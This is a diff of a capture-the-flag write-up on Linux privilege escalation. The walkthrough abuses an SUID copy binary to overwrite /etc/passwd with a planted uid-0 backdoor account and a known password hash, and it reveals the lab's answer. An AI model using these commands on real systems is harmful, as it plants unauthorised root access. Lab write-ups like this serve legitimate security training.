@@ -8,9 +8,9 @@ Once we open the terminal, we are greeted with the challenge prompt.
 
 ![Figure 1: Linux PrivEsc Challenge Prompt](/img/privesc-prompt.png)
 
-We are currently running in the context of a standard non-privileged user account. Our goal is to elevate permissions to a super-user level and run an executable in the `/root` directory to complete the challenge. 
+We are currently running in the context of a standard non-privileged user account. Our goal is to elevate permissions to a superuser[^1] level and run an executable in the `/root` directory to complete the challenge. 
 
-Before looking for privilege escalation vectors, we should perform some basic situational awareness checks.
+Before looking for privilege escalation vectors, we should perform some basic situational awareness checks.  
 
 ```bash
 id
@@ -25,7 +25,7 @@ uname -a
 
 ## Enumeration
 
-It is time to begin enumerating the file system for privilege escalation vectors. Typically, I search for the following low-hanging fruit privilege escalation opportunities first when evaluating a Linux target:
+It is time to begin enumerating the file system for privilege escalation vectors. Typically, I first search for the following low-hanging fruit privilege escalation opportunities when evaluating a Linux target:
 * `sudo`-abusable packages
 * Plaintext credentials stored in environment variables or commnad history transcripts
 * Abusable cron jobs
@@ -69,7 +69,7 @@ The `apt-compat` and `dpkg` cron jobs are default jobs in Linux and not exploita
 
 ### SUID and SGID Marked Binaries
 
-Attempt to check for binaries that have been assigned the SUID or SGID bit.
+Attempt to check for binaries that have been assigned the SUID or SGID bits.
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
@@ -78,7 +78,6 @@ find / -perm -g=s -type f 2>/dev/null
 ```
 
 ![Figure 6: Checking for Binaries with the SUID or SGID Bits Enabled](/img/privesc-suid-sgid.png)
-
 
 The binary `/usr/bin/simplecopy` stands out to me. Check its `--help` menu.
 
@@ -105,6 +104,12 @@ The overwrite seems to work.
 
 ## Exploitation
 
+Before proceeding any further let's quickly discuss with ChatGPT what the SUID bit is and why it can be used to escalate privileges.
+
+![Figure 9: ChatGPT SUID](/img/chatgpt-suid.png)
+
+When the SUID bit is set on an executable file, then when that file is executed by **any** user on the filesystem, the file will be executed in the context of its **owner**, not the actual user executing the file. Similarly, when the SGID bit is set on an executable, all executions of that file will be run in the context of its **group owner**. Binaries located in the `/usr/bin` directory are owned by the *root* user and *root* group--the superuser of a Linux host--and allow any user on the host to execute them. Therefore, if an executable binary in `/usr/bin` has the SUID or SGID bit set, we may be able to escalate privileges if that binary enables us to execute arbitrary commands, read confidential data, or overwrite files important to the security of the host.
+
 This will be our attack methodology:
 * We will generate a DESCrypt hash of a known plaintext that we will use as our backdoor account's password.
 * We will make a copy of `/etc/passwd` and apppend a line to our copy creating a new *root* account using our hash as its password.
@@ -117,7 +122,7 @@ On my personal instance of Kali Linux, I used the `mkpasswd` utility to generate
 echo 'yougotpwnedithappens' | mkpasswd -m descrypt -s
 ```
 
-![Figure 9: Generating a Password Hash with `mkpasswd`](/img/privesc-mkpasswd.png)
+![Figure 10: Generating a Password Hash with `mkpasswd`](/img/privesc-mkpasswd.png)
 
 Back on the target machine, create a backup of `/etc/passwd` in case we need to roll back our changes.
 
@@ -125,7 +130,7 @@ Back on the target machine, create a backup of `/etc/passwd` in case we need to 
 cat /etc/passwd > /tmp/passwd.bak
 ```
 
-![Figure 10: Creating a Backup of `/etc/passwd`](/img/privesc-backup.png)
+![Figure 11: Creating a Backup of `/etc/passwd`](/img/privesc-backup.png)
 
 Continue with the attack by create a writeable copy of `/etc/passwd`, append the new line to `/etc/passwd` that adds a new superuser with our generated password, and validate its contents.
 
@@ -135,7 +140,7 @@ echo 'root2:J68/tUveONM2s:0:0:root:/root:/bin/bash' >> /tmp/passwd
 cat /etc/passwd
 ```
 
-![Figure 11: Creating a Malicious Copy of `/etc/passwd`](/img/privesc-malicious-passwd.png)
+![Figure 12: Creating a Malicious Copy of `/etc/passwd`](/img/privesc-malicious-passwd.png)
 
 With our malicious `/etc/passwd` file prepared, we can now overwrite the contents of `/etc/passwd`.
 
@@ -143,7 +148,7 @@ With our malicious `/etc/passwd` file prepared, we can now overwrite the content
 simplecopy /tmp/passwd /etc/passwd
 ```
 
-![Figure 12: Overwriting the Contents of `/etc/passwd`](/img/privesc-overwrite.png)
+![Figure 13: Overwriting the Contents of `/etc/passwd`](/img/privesc-overwrite.png)
 
 Now when we attempt to authenticate as *root2*, we should enter a shell running in the context of *root*.
 
@@ -151,7 +156,7 @@ Now when we attempt to authenticate as *root2*, we should enter a shell running 
 su root2 - # Enter our password via STDIN
 ```
 
-![Figure 13: Opening a New Session as *root2*](/img/privesc-exploited.png)
+![Figure 14: Opening a New Session as *root2*](/img/privesc-exploited.png)
 
 We are now running in a shell as *root*. Move to the directory `/root` and run the binary to complete the lab. The answer to the question is "santa", of course!
 
@@ -161,7 +166,7 @@ ls -al
 ./runmetoanswer 
 ```
 
-![Figure 14: Running the `runmetoanswer` Binary](/img/privesc-runmetoanswer.png)
+![Figure 15: Running the `runmetoanswer` Binary](/img/privesc-runmetoanswer.png)
 
 Finally, we should exit the *root* shell and replace the current contents of `/etc/passwd` with the `/tmp/passwd.bak` backup file we created earlier. This ensures that we left the target machine the way we left it at the beginning of the engagement. We could also consider patching the vulnerability, but that might result in unintended broken functionality, so we will leave the binary alone for now.
 
@@ -171,4 +176,7 @@ simplecopy /tmp/passwd.bak /etc/passwd
 cat /etc/passwd
 ```
 
-![Figure 15: House Cleaning Operations](/img/privesc-house-cleaning.png)
+![Figure 16: House Cleaning Operations](/img/privesc-house-cleaning.png)
+
+[^1]: https://csrc.nist.gov/glossary/term/superuser
+[^2]: https://linuxhandbook.com/suid-sgid-sticky-bit/
